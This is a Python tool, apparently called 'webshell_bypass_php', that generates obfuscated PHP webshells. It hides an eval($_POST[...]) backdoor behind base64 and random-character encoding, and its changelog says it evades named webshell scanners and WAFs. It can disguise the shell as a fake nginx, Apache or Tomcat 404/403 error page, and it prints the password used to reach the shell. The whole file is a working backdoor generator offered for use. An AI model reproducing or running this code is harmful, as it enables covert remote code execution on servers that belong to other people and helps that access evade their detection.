import string
import random
import base64
import sys
from colorama import init
from termcolor import colored
from argparse import ArgumentParser
import os
import time

'''
免杀原理
base64 编码，把关键字符base后，打乱，并添加其他字符
'''
init()


def character_encode(replace_string, length, confusing_characters=""):
    encoding_string = ""
    if confusing_characters == "":
        confusing_characters = "".join(random.sample(string.ascii_letters + string.digits, length))  # 生成随机字符
    while True:
        rand_len = int(random.randint(1, 4))  # 返回1到4之间的整数
        if (len(replace_string) <= rand_len):
            encoding_string += replace_string + confusing_characters
            break
        encoding_string += replace_string[:rand_len] + confusing_characters
        replace_string = replace_string[rand_len:]
    return encoding_string, confusing_characters


def free_kill(php_name):
    decode_string = character_encode("base64_decode", 50)
    replace_string = character_encode("str_replace", 50)
    fun = character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50)
    ph_1 = character_encode(base64.b64encode("eval($_POST['".encode('utf-8')).decode('utf-8'), 50)
    ph_2 = character_encode(base64.b64encode("']);".encode('utf-8')).decode('utf-8'), 50)

    keys = ''.join(random.sample(string.ascii_letters + string.digits, 4))
    print(colored(f'随机密码key生成成功：', 'green'), colored(keys, 'red'))
    if php_name != None:
        if '.php' in php_name:
            print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
        else:
            php_name = php_name + '.php'
            print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
    else:
        if '.php' in php_name:
            print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
        else:
            php_name = php_name + '.php'
            print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
    php_names = php_name
    php_name = '\\' + php_name
    lj = input('输入保存shell文件的绝对路径(直接回车就是当前脚本路径)：')
    if lj == '':
        lj = os.path.split(os.path.realpath(__file__))[0]
        print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
    else:
        print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
    lj_data = lj + php_name
    print(colored('路径拼接成功：', 'green'), colored(lj_data, 'red'))
    webshelldata = f"""
    <?php
    $a='str_';
    $b=$a.'replace';//此文件是报告错误文件，请勿删除
    $r_e_p=substr($b,6);
    $r_e_p_1='zxcszxctzxcrzxc_zxcrzxcezxc';
    $r_e_p_1=substr_replace('zxc','str_re',$r_e_p_1);
    $r_e_p=$r_e_p_1.$r_e_p;
    $rep = $r_e_p("{replace_string[1]}", "", "{replace_string[0]}");
    $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
    $ba1=substr($base,6);
    $ba2='bzxcazxcszxcezxc6zxc4';
    $base=substr_replace('zxc','base64',$ba2);
    $base=$base.$ba1;
    $func = $base($rep("{fun[1]}", "", "{fun[0]}"));
    $func1 = substr($func,6);
    $func2='cwsxrwsxewsxawsxtwsxewsx';
    $func2=substr_replace('wsx','create',$func2);
    $func = $func2.$func1;
    $p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
    $p_2 = "{keys}";
    $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
     """ + """
    if($_GET['a'] > $_GET['b'] and $_POST['c'] !== $_POST['d']){//比对错误的返回值
        if(md5($_GET['c'])=== md5($_GET['d'])){
            $value1 = $p_1;
            $$value1 = $p_2;
            $zh=$value1.$$value1;
            $value2=$zh;
            $$value2=$p_3;
            $namex=$value2;
            $namez=$$value2;
            @$n = $func('$echo1,$echo2','return "$echo1"."$echo2";');
            $n1=$n($namex,$namez);
            @$p = $func("", $n1);
            $p();
        }
    }
    ?>
    """
    try:
        with open(lj_data, "w+") as f:
            a = input("选择伪装（1，2，3，4，5，6，7，8）默认是8：")
            if a == '1':
                statement = f"""
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
{webshelldata}
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
        """
            elif a == '2':
                xx = '{'
                yy = '}'
                statement = f"""
        <!doctype html><html lang="en"><head><title>HTTP Status 404 - Not Found</title><style type="text/css">h1 
        {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;{yy} h2 {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;{yy} h3 {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;{yy} body {xx}font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;{yy} b {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;{yy} p {xx}font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;{yy} a {xx}color:black;{yy} a.name {xx}color:black;{yy} .line {xx}height:1px;background-color:#525D76;border:none;{yy}
        </style>
        </head>
        <body>
        <h1>HTTP Status 404 - Not Found</h1><hr class="line" />
        <p>
        <b>Type</b> Status Report</p>
        <p><b>Message</b> Not found</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.21</h3></body></html>
{webshelldata}
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
                    """
            elif a == '3':
                statement = f"""
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
{webshelldata}
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
                    """
            elif a == '4':
                ip = input("伪装4需要目标Ip，输入对方服务器ip：")
                statement = f"""
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.46 (Ubuntu) Server at {ip} Port 80</address>
</body></html>
{webshelldata}
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
                                    """
            elif a == '5':
                statement = f"""
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
{webshelldata}
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
                                    """
            elif a == '6':
                ml = input("此需要一个错误的路径(如： /cs/默认的是/config/)：")
                if ml == '':
                    ml = '/config/'
                else:
                    if '/' in ml:
                        pass
                    else:
                        ml = '/' + ml + '/'
                statement = f"""
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access {ml}
on this server.<br />
</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
{webshelldata}
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
                                                    """
            elif a == 7:
                ml = input("此需要一个错误的文件(如：/cs/a.php，默认的是：/config/index.php)：")
                if ml == '':
                    ml = '/config/index.php'
                statement = f"""
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL {ml} was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
{webshelldata}
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
                                                                    """
            else:
                a = "默认8"
                statement = f"""
{webshelldata}
"""
            f.write(statement)
            f.close()
    except FileNotFoundError as error:
        with open('erroe.txt', 'a+', encoding='utf-8') as k:
            k.write('---------------------------------------------------------------------' + '\n')
            k.write(f'文件名: {php_names}\n')
            times = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
            k.write('time：' + str(times) + '\n')
            k.write('error：' + str(error) + '\n\n')
            print(colored('发生未知错误: 文件名 or 文件类型错误', 'red'))
        sys.exit()
    except Exception as error:
        with open('erroe.txt', 'a+', encoding='utf-8') as k:
            k.write('---------------------------------------------------------------------' + '\n')
            k.write(f'文件名: {php_names}\n')
            times = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
            k.write('time：' + str(times) + '\n')
            k.write('error：' + str(error) + '\n\n')
            print(colored('发生未知错误', 'red'))
        sys.exit()
    with open('success.txt', 'a+', encoding='utf-8') as c:
        print(colored('path：', 'green'), colored(lj_data, 'red'))
        print(colored('密码key：', 'green'), colored(f'get: ?a=2&b=1', 'red'))
        print(colored('密码key：', 'green'), colored(f'post: c[]=1&d[]=2&{keys}', 'red'))
        c.write('---------------------------------------------------------------------' + '\n')
        times = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
        c.write(f'页面伪装: {a} \n')
        c.write(f'文件名: {php_names}\n')
        c.write('time：' + str(times) + '\n')
        c.write(f'path：{lj_data}' + '\n')
        c.write(f'password get: ?a=2&b=1' + '\n')
        c.write(f'password post: c[]=1&d[]=2&{keys}' + '\n\n')


if __name__ == "__main__":
    name = colored('webshell_bypass_php_4.2 by 弱鸡', 'green')
    name = name + "\n\n交流群：655934283\n\n\n\ngithub：https://github.com/ytMuCheng/ruoji"
    arg = ArgumentParser(description=name)
    arg.add_argument("-p",
                     "--php",
                     help=f"{colored('-p 文件名 or --php 文件名', 'green')}")
    arg.add_argument("-j",
                     "--jsp",
                     help=f"{colored('-j 文件名 or --jsp 文件名', 'green')}")
    arg.add_argument("-c",
                     "--config",
                     help=f"{colored('查看配置 -c 1 or --config 1', 'green')}")
    args = arg.parse_args()
    php = args.php
    jsp = args.jsp
    config = args.config
    i = 0  # 判断有没有调用输出配置文件
    if php != None or jsp != None or config != None:
        if config != None:
            path = os.path.split(os.path.realpath(__file__))[0]  # 获取脚本当前路径
            current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))  # 获取当前时间
            print(f"""
            |---------------------------------------
            |{colored('php_弱鸡_webshelll免杀生成 4.3', 'red')}
            |密码随机                            
            |伪装1和3适用于linux服务器
            |伪装2适用于iis服务器
            |4和5是403错误，123是404，6是禁止访问
            |7是文件访问不存在 404
            |默认为8，就是php代码，没有伪装代码
            |路径为绝对路径如：C:\\xxx\\xxx\\Desktop
            |---------------------------------------
            |by 弱鸡
            |版本1.0: 加入了显示页面伪装
            |版本2.0: 加入了自定义文件名以及错误处理
            |        添加了过某些waf
            |版本3.0: 对一些敏感函数加密
            |版本4.0: 修复了使用错误
            |        4.1: 修改了报错问题
            |        4.2: 绕过d盾牌检测
            |        4.3: 绕过河马检测，并添加了严格的密码验证 
            |---------------------------------------
            |配置信息
            |默认生成shell文件路径：{path}
            |time：{current_time}
            -------------------------------------------
            """)
            i = 1
        if php != None:
            if i == 1:
                pass
            else:
                path = os.path.split(os.path.realpath(__file__))[0]
                current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
                print(f"""
                |---------------------------------------
                |{colored('php_弱鸡_webshelll免杀生成 4.3', 'red')}
                |密码随机                            
                |伪装1和3适用于linux服务器
                |伪装2适用于iis服务器
                |4和5是403错误，123是404，6是禁止访问
                |7是文件访问不存在 404
                |默认为8，就是php代码，没有伪装代码
                |路径为绝对路径如：C:\\xxx\\xxx\\Desktop
                |---------------------------------------
                |by 弱鸡
                |版本1.0: 加入了显示页面伪装
                |版本2.0: 加入了自定义文件名以及错误处理
                |        添加了过某些waf
                |版本3.0: 对一些敏感函数加密
                |版本4.0: 修复了使用错误
                |        4.1: 修改了报错问题
                |        4.2: 绕过d盾牌检测
                |        4.3: 绕过河马检测，并添加了严格的密码验证 
                |---------------------------------------
                |配置信息
                |默认生成shell文件路径：{path}
                |time：{current_time}
                -------------------------------------------
                """)
            free_kill(php_name=php)
        if jsp != None:
            print(colored('\njsp免杀_还在编写中', 'red'))
    else:
        name = os.path.basename(__file__)
        os.system(f'python {name} -h')
